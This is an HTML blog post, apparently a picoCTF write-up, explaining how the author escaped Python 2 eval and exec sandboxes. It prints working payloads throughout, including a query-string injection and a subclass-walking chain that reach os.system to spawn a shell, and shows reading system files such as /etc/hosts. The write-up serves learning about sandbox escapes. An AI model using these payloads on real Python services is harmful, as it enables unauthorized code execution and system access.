@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+    <title>Zolmeister</title>
+    <meta name="description" content="Zolmeister- Blog" />
+    <link href='http://zolmeister.com/favicon.ico' rel='icon' type='image/x-icon'/>
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="MobileOptimized" content="320" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" type="text/css" href="/assets/css/normalize.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css" />
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Noto+Serif:400,700,400italic|Open+Sans:700,400" />
+    <!-- This is for syntax highlight -->
+    <link rel="stylesheet" type="text/css" href="/assets/css/syntax.css">
+    <!-- Customisation  -->
+    <link rel="stylesheet" type="text/css" href="/assets/css/main.css" />
+
+    <!-- RSS -->
+    <link rel="alternate" type="application/atom+xml" title="Zolmeister - Atom" href="http://www.zolmeister.com/feeds/posts/default" />
+    <link rel="alternate" type="application/rss+xml" title="Zolmeister - RSS" href="http://www.zolmeister.com/feeds/posts/default?alt=rss" />
+
+</head>
+<body class="home-template">
+
+
+    <main class="content" role="main">
+
+    <article class="post">
+        <header class="post-header">
+            <a id="blog-logo" href="/">
+                
+                    <span class="blog-title">Zolmeister</span>
+                
+            </a>
+        </header>
+
+        <span class="post-meta">
+        	<time datetime="2013-05-06">06 May 2013</time>
+        	<!--
+        		on
+	        	
+	        -->
+       	</span>
+
+        <h1 class="post-title"><a href="">Escaping the Python Sandbox</a></h1>
+
+        <section class="post-content">
+            <p>(<a href="http://www.zolmeister.com/2013/05/rop-return-oriented-programming-basics.html">ROP</a>, <a href="http://www.zolmeister.com/2013/05/buffer-overflows-basics.html">Overflow</a>, <a href="http://haeresy.tumblr.com/post/49835546090/format-2">format 2</a>, <a href="http://haeresy.tumblr.com/post/49815517485/mildly-evil">mildly evil</a>, <a href="http://haeresy.tumblr.com/post/49837209727/moreevil">more evil</a>,&nbsp;<a href="https://gist.github.com/11rcombs/5530361#file-aespaddingoracle-py">broken cbc</a>,&nbsp;<a href="https://gist.github.com/11rcombs/5530211">evergreen</a>&nbsp;(<a href="https://gist.github.com/Zolmeister/5530473">2</a>), <a href="http://haeresy.tumblr.com/post/49832356680/black-hole">black hole</a>, <a href="https://gist.github.com/11rcombs/5530290">broken rsa</a>, <a href="https://gist.github.com/Zolmeister/5530477">chromatophoria</a>(<a href="https://gist.github.com/11rcombs/5530201#file-steg-js">2</a>), <a href="https://gist.github.com/Zolmeister/5530463">harder serial</a>,&nbsp;<a href="https://gist.github.com/Zolmeister/5530467">robomunication</a>)</p>
+
+<p>tl;dr</p>
+
+<p><code>eval(compile(&#39;print key&#39;, &#39;&lt;stdin&gt;&#39;, &#39;exec&#39;))</code></p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">GET /index.html?a=&quot;}+eval(&quot;__import__(&#39;os&#39;).system(&#39;/bin/sh&#39;)&quot;)+{&quot;
+</code></pre></div><div class="highlight"><pre><code class="language-text" data-lang="text">__builtins__[&#39;ww&#39;]=().__class__.__base__
+__builtins__[&#39;w&#39;]=ww.__subclasses__()
+__builtins__[&#39;y&#39;]=w[53].__enter__.__func__
+__builtins__[&#39;a&#39;]=y.__globals__[&#39;linecache&#39;]
+__builtins__[&#39;os&#39;]=a.checkcache.__globals__[&#39;os&#39;]
+os.system(&#39;cat *&#39;)
+().__class__.__base__`.__subclasses__()[53].__enter__.__func__.__globals__[&#39;linecache&#39;].checkcache.__globals__[&#39;os&#39;].system(&#39;sh&#39;)
+</code></pre></div>
+<p>This post is a write up of how I solved the python problems from <a href="https://picoctf.com/">picoCTF</a>. Basically the problems consist of a&nbsp;piece&nbsp;of python code, which takes user input, and then eval&#39;s it. Eval then allows us to get a shell. Lets explore.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     # example1.py
+     x = input(&quot;enter something to eval:\n&quot;)
+     print &quot;x:&quot;,x
+</code></pre></div>
+<p>This is python2.7, which means that the proper way to get input is with &quot;raw_input&quot;. The issue with &quot;input&quot; is that it eval&#39;s the string. That means we can do things like this:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">    enter something to eval:
+     2*100
+     x: 200
+</code></pre></div>
+<p>But if we try to do something like this:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     enter something to eval:
+     print &quot;hello world&quot;
+     Traceback (most recent call last):
+      File &quot;pytest.py&quot;, line 2, in &lt;module&gt;
+       x = input(&quot;enter something to eval:\n&quot;)
+      File &quot;&lt;string&gt;&quot;, line 1
+       print &quot;hello world&quot;
+         ^
+     SyntaxError: invalid syntax
+</code></pre></div>
+<p>We get an error. This is because <a href="http://docs.python.org/2/library/functions.html#eval">eval</a> evaluates an <em>expression</em>. However we can get around this limitation by running some special code:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">eval(compile(&#39;print &quot;hello world&quot;&#39;, &#39;&lt;stdin&gt;&#39;, &#39;exec&#39;))
+</code></pre></div>
+<p>Which looks like this:</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python">    <span class="k">def</span> <span class="nf">listFiles</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="nb">dir</span><span class="p">,</span> <span class="n">files</span><span class="p">):</span>
+       <span class="k">print</span> <span class="n">files</span>
+     <span class="n">path</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="s">&quot;.&quot;</span><span class="p">,</span> <span class="n">listFiles</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
+</code></pre></div>
+<p>And then we put it in our special method:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">eval(compile(&#39;def listFiles(a, dir, files):\n\tprint files\npath.walk(&quot;.&quot;,listFiles,None)&#39;, &#39;&lt;stdin&gt;&#39;, &#39;exec&#39;))
+</code></pre></div>
+<p>And look! (we get an error) but it lists all of the files in the directory (specifically &#39;your<em>flag</em>here&#39;). Lets read that file.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">eval(compile(&#39;print open(&quot;your_flag_here&quot;).read()&#39;, &#39;&lt;stdin&gt;&#39;, &#39;exec&#39;))
+</code></pre></div>
+<p>Ok, that solves python 3. Python 4 is a fair bit easier. Since we get the &#39;import&#39; function, all we need is to get an eval on <code>&quot;__import__(&#39;os&#39;).system(&#39;/bin/sh&#39;)&quot;</code> and we&#39;re good to go. After a bit of research on <a href="http://en.wikipedia.org/wiki/Query_string">Query Strings</a>, we get this:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">GET /index.html?a=&quot;}+eval(&quot;__import__(&#39;os&#39;).system(&#39;/bin/sh&#39;)&quot;)+{&quot;
+</code></pre></div>
+<p>Cool, now onto the harder python 5 (this one was by far the most fun). Here is the source:</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python">     <span class="c">#!/usr/bin/python -u</span>
+     <span class="c"># task5.py</span>
+     <span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">modules</span>
+     <span class="n">modules</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
+     <span class="k">del</span> <span class="n">modules</span>
+     <span class="n">_raw_input</span> <span class="o">=</span> <span class="nb">raw_input</span>
+     <span class="n">_BaseException</span> <span class="o">=</span> <span class="ne">BaseException</span>
+     <span class="n">_EOFError</span> <span class="o">=</span> <span class="ne">EOFError</span>
+     <span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
+     <span class="n">__builtins__</span> <span class="o">=</span> <span class="bp">None</span>
+     <span class="k">print</span> <span class="s">&#39;Get a shell, if you can...&#39;</span>
+     <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+      <span class="k">try</span><span class="p">:</span>
+       <span class="n">d</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;x&#39;</span><span class="p">:</span><span class="bp">None</span><span class="p">}</span>
+       <span class="k">exec</span> <span class="s">&#39;x=&#39;</span><span class="o">+</span><span class="n">_raw_input</span><span class="p">()[:</span><span class="mi">50</span><span class="p">]</span> <span class="ow">in</span> <span class="n">d</span>
+       <span class="k">print</span> <span class="s">&#39;Return Value:&#39;</span><span class="p">,</span> <span class="n">d</span><span class="p">[</span><span class="s">&#39;x&#39;</span><span class="p">]</span>
+      <span class="k">except</span> <span class="n">_EOFError</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+       <span class="k">raise</span> <span class="n">e</span>
+      <span class="k">except</span> <span class="n">_BaseException</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+       <span class="k">print</span> <span class="s">&#39;Exception:&#39;</span><span class="p">,</span> <span class="n">e</span>
+</code></pre></div>
+<p>The answer to this is the second chunk of code in the tl;dr at the top, but I&#39;m going to explain how I got there. The first thing I did was look up to documentation for <a href="http://docs.python.org/release/2.0/ref/exec.html">exec</a>. Then I went to see what kinds of things I had access to.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     Get a shell, if you can...
+     print &quot;a&quot;
+     Exception: invalid syntax (&lt;string&gt;, line 1)
+     eval(&quot;2+2&quot;)
+     Exception: name &#39;eval&#39; is not defined
+     x
+     Return Value: None
+     x.__class__
+     Return Value: &lt;type &#39;NoneType&#39;&gt;
+     __builtins__
+     Return Value: {}
+     y
+     Exception: name &#39;y&#39; is not defined
+     __builtins__[&#39;y&#39;]=1337
+     Return Value: 1337
+     y
+     Return Value: 1337
+</code></pre></div>
+<p>Cool, I can get around the 50 character limit by setting values to <code>__builtins__</code>. Lets dig deeper into that <code>x.__class__</code> (I didn&#39;t get there as quickly as below, but you get the idea. Just use <code>__base__</code>, <code>__bases__</code>, <code>__class__</code>, <code>__mro__</code>, <code>__subclasses__</code> etc - <a href="http://www.cafepy.com/article/python_attributes_and_methods/python_attributes_and_methods.html">read this</a>):</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     x.__class__
+     Return Value: &lt;type &#39;NoneType&#39;&gt;
+     x.__class__.__base__
+     Return Value: &lt;type &#39;object&#39;&gt;
+     x.__class__.__base__.__subclasses__
+     Return Value: &lt;built-in method __subclasses__ of type object at 0x88cd40&gt;
+     x.__class__.__base__.__subclasses__()
+     Return Value: [&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;,...
+</code></pre></div>
+<p>Ok, I have a long list of values there, but now I have to find out if I can use them to get a shell. Some special values I noticed were:&nbsp;<type 'file'>,&nbsp;<type 'module'>, <type 'zipimport.zipimporter'>. Lets look at file first:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     #setup variable &#39;w&#39; to access the values
+     __builtins__[&#39;ww&#39;]=().__class__.__base__
+     __builtins__[&#39;w&#39;]=ww.__subclasses__()
+     # file
+     w[40]
+     # open a file
+     w[40](&#39;/etc/hosts&#39;).read()
+     # write to a file
+     w[40](&#39;test&#39;,&#39;w&#39;).write(&#39;test string&#39;)
+     Exception: [Errno 13] Permission denied: &#39;test&#39;
+     # lets try somewhere else
+     w[40](&#39;/tmp/test&#39;,&#39;w&#39;).write(&#39;test string&#39;)
+     # read it back
+     w[40](&#39;/tmp/test&#39;).read()
+</code></pre></div>
+<p>Cool. Too bad we don&#39;t know the name of the key file (otherwise we could just read it in). Lets look at <module> next:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     w[47]
+     Return Value: &lt;type &#39;module&#39;&gt;
+     w[47](&#39;os&#39;)
+     Return Value: &lt;module &#39;os&#39; (built-in)&gt;
+     w[47](&#39;os&#39;).system
+     Exception: &#39;module&#39; object has no attribute &#39;system&#39;
+</code></pre></div>
+<p>Yeah, I tried for a long time, but couldn&#39;t get it to create a useful object. Lets move on to <a href="http://docs.python.org/2/library/zipimport.html">zipimporter</a>. It looks like we should be able to read in a zip file containing a python module. The next step is figuring out how to get a zip onto the server. Remember that we can write arbitrary files to /tmp, and that python can write arbitrary bytes in strings with its escape sequence. This means we can do this:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     #the zip file in hex
+     50 4b 03 04 14 03 00 00 08 00 ce ad a4 42 5e 13 60 d0 22 00 00 00 23 00 00 00 04 00 00 00 7a 2e 70 79 cb cc 2d c8 2f 2a 51 c8 2f e6 2a 28 ca cc 03 31 f4 8a 2b 8b 4b 52 73 35 d4 93 13 4b 14 b4 d4 35 b9 00 50 4b 01 02 3f 03 14 03 00 00 08 00 ce ad a4 42 5e 13 60 d0 22 00 00 00 23 00 00 00 04 00 00 00 00 00 00 00 00 00 20 80 a4 81 00 00 00 00 7a 2e 70 79 50 4b 05 06 00 00 00 00 01 00 01 00 32 00 00 00 44 00 00 00 00 00
+     #save it to strings in 7 byte chuks
+     __builtins__[&#39;a&#39;]=&#39;\x50\x4b\x03\x04\x14\x03\x00&#39;
+     __builtins__[&#39;b&#39;]=&#39;\x00\x08\x00\xce\xad\xa4\x42&#39;
+     ...
+     __builtins__[&#39;t&#39;]=&#39;\x00\x44\x00\x00\x00\x00\x00&#39;
+     __builtins__[&#39;u&#39;]=a+b+c+d+e+f+g+h+i+j+k+l+m+n+o
+     __builtins__[&#39;v&#39;]=u+p+q+r+s+t
+     #write it to a file
+     w[40](&#39;/tmp/z&#39;,&#39;wb&#39;).write(v)
+     #now lets load it in
+     w[49]
+     Return Value: &lt;type &#39;zipimport.zipimporter&#39;&gt;
+     #and....
+     w[49](&#39;/tmp/z&#39;).load_module(&#39;z&#39;)
+     Exception: can&#39;t decompress data; zlib not available
+</code></pre></div>
+<p>That last part... after all that work... made me... sad. Very sad.</p>
+
+<p>But I had to move on, and get past the fact that they COMPILED PYTHON WITHOUT ZLIB. Next, I tried to just overwrite their file with my own:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     w[40](&#39;task5.py&#39;,&#39;w&#39;).write(&#39;z&#39;)
+     Exception: [Errno 13] Permission denied: &#39;task5.py&#39;
+</code></pre></div>
+<p>No luck. I then googled around and found <a href="http://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/">this page</a>. The main post seemed like it could work, but was too complicated for me to fully grasp (and also there&#39;s a 50 character limit per entry, so it would take forever to input it). What interested me more was the comment:</p>
+
+<h4>TL;DR</h4>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     __builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &#39;catch_warnings&#39;][0]()._module.__builtins__)
+     import sys; print open(sys.argv[0]).read()
+</code></pre></div>
+<p>Hey, I can do that!</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     # the class
+     w[53]
+     Return Value: &lt;class &#39;warnings.catch_warnings&#39;&gt;
+     #and.....
+     w[53]()._module.__builtins__
+     Exception: &#39;warnings&#39;
+</code></pre></div>
+<p>Nope. Not today.
+So I kept looking (I was going though the modules by hand for a while, but no luck)
+Then I found this <a href="http://nedbatchelder.com/blog/201302/finding_python_3_builtins.html">script</a>. Huh, that looks interesting. Lets run it on my machine (after reading the source).</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">    ...
+    Examining codecs.IncrementalEncoder
+     Looks like codecs.IncrementalEncoder.__init__.__func__.__globals__[&#39;__builtins__&#39;] might be builtins
+     Examining codecs.IncrementalEncoder()
+    ...
+</code></pre></div>
+<p>Well, as it turns out, those are false positives (they return the local broken <code>__builtins__</code>). I added this to the searching script to have it find less false positives:</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python">     <span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">modules</span>
+     <span class="n">modules</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
+     <span class="k">del</span> <span class="n">modules</span>
+</code></pre></div>
+<p>Now the results are less, but still quite&nbsp;numerous. Based on the information previously learned from <a href="http://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/">this guy</a>, I realized that the key was to get into an objects <code>__enter__</code>. Scrolling though the&nbsp;indices&nbsp; we see that warnings.catch<em>warnings (previously caused an exception) can be accessed through its `</em><em>enter</em>_` param (without invoking it). This looks quite promising, and using one of the strings from the search, we get this:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     # target, with 50 character max per line
+     # warnings.catch_warnings.__enter__.__func__.__globals__[&#39;linecache&#39;].checkcache.__globals__[&#39;os&#39;]
+     w[53]
+     Return Value: &lt;class &#39;warnings.catch_warnings&#39;&gt;
+     __builtins__[&#39;y&#39;]=w[53].__enter__.__func__
+     Return Value: &lt;function __enter__ at 0x7fdf74cfe1b8&gt;
+     y
+     Return Value: &lt;function __enter__ at 0x7fdf74cfe1b8&gt;
+     __builtins__[&#39;a&#39;]=y.__globals__[&#39;linecache&#39;]
+     Return Value: &lt;module &#39;linecache&#39; from &#39;/usr/lib/python2.7/linecache.pyc&#39;&gt;
+     __builtins__[&#39;os&#39;]=a.checkcache.__globals__[&#39;os&#39;]
+     Return Value: &lt;module &#39;os&#39; from &#39;/usr/lib/python2.7/os.pyc&#39;&gt;
+     os.system(&#39;sh&#39;)
+</code></pre></div>
+<p><a href="http://eindbazen.net/2013/04/pctf-2013-pyjail-misc-400/">Thank you sir, may I have another?</a></p>
+
+        </section>
+
+        
+
+        <footer class="post-footer">
+        	<!-- If we want to display author's name and bio -->
+            
+                <section class="author">
+                	<header> <a href=""> <img class="profile" src="/assets/images/profile.png" alt="Zolmeister"></a></header>
+                	<article>
+                		<!-- Author Name -->
+                    	<h4> Zoli Kahan </h4>
+                    	<!-- Author Bio -->
+                    	<p>
+                    		<a target="_blank" href="http://insignia.zolmeister.com">Projects</a> |
+                        <a target="_blank" href="https://github.com/Zolmeister">GitHub</a> |
+                        <a target="_blank" href="https://clay.io">Clay.io</a>
+                    	</p>
+                    </article>
+                </section>
+            
+
+            <section class="share">
+                <h4>Share this post</h4>
+                <a class="icon-twitter" href="http://twitter.com/share?text=Escaping the Python Sandbox&amp;url=http://zolmeister.com/2013/05/escaping-python-sandbox.html"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <span class="hidden">Twitter</span>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://zolmeister.com/2013/05/escaping-python-sandbox.html"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <span class="hidden">Facebook</span>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=http://zolmeister.com/2013/05/escaping-python-sandbox.html"
+                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <span class="hidden">Google+</span>
+                </a>
+            </section>
+
+            
+            <section class="disqus">
+        	    <div id="disqus_thread"></div>
+              <script type="text/javascript">
+                  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+                  var disqus_shortname = 'zolmeister'; // required: replace example with your forum shortname
+
+                  /* * * DON'T EDIT BELOW THIS LINE * * */
+                  (function() {
+                      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                  })();
+              </script>
+
+            </section>
+            
+
+        </footer>
+
+    </article>
+
+</main>
+
+
+    <footer class="site-footer">
+        <a class="subscribe icon-feed" href="feeds/posts/default"><span class="tooltip">Subscribe!</span></a>
+        <div class="inner">
+             <section class="copyright">All content copyright <a href="">Zolmeister</a> &copy;  &bull; All rights reserved.</section>
+        </div>
+    </footer>
+
+
+    <script type="text/javascript" src="/assets/js/jquery-1.10.2.min.js"></script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="/assets/js/index.js"></script>
+
+    <!-- Google Analytics Tracking code -->
+    <script type="text/javascript">
+
+      var _gaq = _gaq || [];
+      _gaq.push(['_setAccount', 'UA-30570115-1']);
+      _gaq.push(['_trackPageview']);
+
+      (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+      })();
+
+    </script>
+</body>
+</html>
